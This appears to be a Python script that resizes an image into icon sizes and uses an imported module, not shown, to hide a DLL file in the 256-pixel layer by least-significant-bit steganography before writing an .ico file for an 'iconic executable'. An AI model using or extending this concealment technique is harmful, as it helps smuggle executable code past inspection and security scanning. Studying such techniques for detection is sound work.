import hide_dll
import argparse
import subprocess
import os

def create_icon(input_image_path, output_icon_path, dll_path, output_stego_image_path="temp_.png"):
    
    # Defines the resolution of the images for the icon
    icon_sizes = [16, 32, 48, 64, 128, 256]
    
    # Creates a list of temporary files with the resized images
    temp_files = []
    for size in icon_sizes:
        temp_file = f"temp_{size}.png"
        temp_files.append(temp_file)
        
        # Uses ImageMagick to resize the image
        subprocess.run(["magick", input_image_path, "-resize", f"{size}x{size}", temp_file])

    input_stego_image_path = "temp_256.png" 

    dll_bits = hide_dll.read_dll_as_bits(dll_path)
    hide_dll.embed_lsb_in_image(input_stego_image_path, dll_bits, output_stego_image_path)

    os.remove(input_stego_image_path)
    os.rename(output_stego_image_path, input_stego_image_path)

    # Now, after the modification, create the .ico file with the resized images
    subprocess.run(["magick"] + temp_files + [output_icon_path])

    # Delete temporary files
    for temp_file in temp_files:
        os.remove(temp_file)

    print(f"Icon saved in {output_icon_path}")


def main():
    
    parser = argparse.ArgumentParser(description="Automation of the process of creating an iconic executable")
    
    parser.add_argument('input_image_for_icon', type=str, help="Path to the input image (e.g., input_image.png)")
    parser.add_argument("dll_path", help="DLL file path")
    parser.add_argument('output_icon', type=str, help="Path to the output .ico file (e.g., output_icon.ico)")
    
    args = parser.parse_args()

    # Create the icon using the provided paths
    create_icon(args.input_image_for_icon, args.output_icon, args.dll_path )

if __name__ == "__main__":
    main()